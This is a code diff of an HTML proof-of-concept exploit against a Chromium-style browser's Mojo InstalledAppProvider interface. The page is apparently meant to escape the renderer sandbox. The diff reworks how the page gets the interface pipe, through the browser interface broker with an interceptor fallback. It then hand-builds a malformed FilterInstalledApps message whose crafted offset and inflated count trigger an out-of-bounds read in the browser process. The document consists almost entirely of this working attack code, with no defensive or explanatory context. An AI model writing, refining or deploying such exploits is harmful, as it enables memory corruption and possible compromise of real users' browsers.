@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>InstalledAppProvider OOB – Browser RCE (Direct Bind)</title>
+    <title>InstalledAppProvider via Browser Interface Broker</title>
 </head>
 <body>
-    <h1>InstalledAppProvider Sandbox Escape – Direct Bind</h1>
+    <h1>InstalledAppProvider OOB – via BrowserInterfaceBroker</h1>
     <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
     <script>
     (async () => {
@@ -14,17 +14,40 @@
         };
 
         try {
-            // 1. Get the interface provider (requires MojoJSTest)
-            const provider = Mojo.getInterfaceProvider();
-            log('Got interface provider');
+            let pipe;
 
-            // 2. Bind InstalledAppProvider directly
-            const handle = Mojo.bindInterface('blink.mojom.InstalledAppProvider', provider);
-            const remote = new blink.mojom.InstalledAppProviderPtr(handle);
-            const pipe = remote.ptr.getHandle();
-            log('Bound to InstalledAppProvider');
+            // Method 1: Use Mojo.browserInterfaceBroker (if available)
+            if (Mojo.browserInterfaceBroker) {
+                log('browserInterfaceBroker found');
+                const {handle0: client, handle1: server} = Mojo.createMessagePipe();
+                Mojo.browserInterfaceBroker.getInterface('blink.mojom.InstalledAppProvider', server);
+                pipe = client;
+                log('Got InstalledAppProvider via broker');
+            }
+            // Method 2: Fallback – try to intercept (may not fire, but we try)
+            else if (typeof MojoInterfaceInterceptor !== 'undefined') {
+                log('Trying interceptor...');
+                const interceptor = new MojoInterfaceInterceptor('blink.mojom.InstalledAppProvider', 'process');
+                interceptor.oninterfacerequest = (e) => {
+                    interceptor.stop();
+                    pipe = e.handle;
+                    log('Got InstalledAppProvider via interceptor');
+                };
+                interceptor.start();
+                // Trigger the request
+                if (navigator.getInstalledRelatedApps) {
+                    navigator.getInstalledRelatedApps().catch(() => {});
+                }
+                // Wait 2 seconds
+                await new Promise(r => setTimeout(r, 2000));
+                if (!pipe) {
+                    throw new Error('Interceptor did not fire');
+                }
+            } else {
+                throw new Error('No method available to get InstalledAppProvider');
+            }
 
-            // 3. Build the malicious FilterInstalledApps message
+            // 2. Build the malicious FilterInstalledApps message
             const payload = new ArrayBuffer(256);
             const v = new DataView(payload);
 
@@ -39,23 +62,19 @@
             // offset 20: uint32 count (must be >= 2 to trigger pointer arithmetic)
             // offset 24: uint64 relative_offset
             v.setUint32(20, 2, true);         // count = 2
-            // Relative offset = target - (puVar1 + 8) = 0x52 - (16+8) = 0x52 - 0x18 = 0x3A
+            // Relative offset = 0x52 - (16+8) = 0x3A
             v.setBigInt64(24, BigInt(0x3A), true);
 
-            // The computed array pointer will be: puVar1 + offset + 0x20 = 16 + 0x3A + 0x20 = 0x70
-            // At offset 0x70 we place a huge array count (e.g., 0x1000)
-            v.setUint32(0x70, 0x1000, true);   // huge number of apps → out‑of‑bounds read
+            // At computed array pointer (0x70), put a huge count
+            v.setUint32(0x70, 0x1000, true);   // huge → OOB read
 
-            // 4. Send the raw message (no handles)
+            // 3. Send the raw message
             pipe.writeMessage(payload, []);
-            log('Malicious FilterInstalledApps sent!');
-            log('Browser process should crash or exhibit memory corruption now.');
+            log('Malicious message sent! Browser should crash...');
 
-            // Keep the page alive
             setInterval(() => {}, 10000);
         } catch (e) {
             log('Error: ' + e.message);
-            console.error(e);
         }
     })();
     </script>
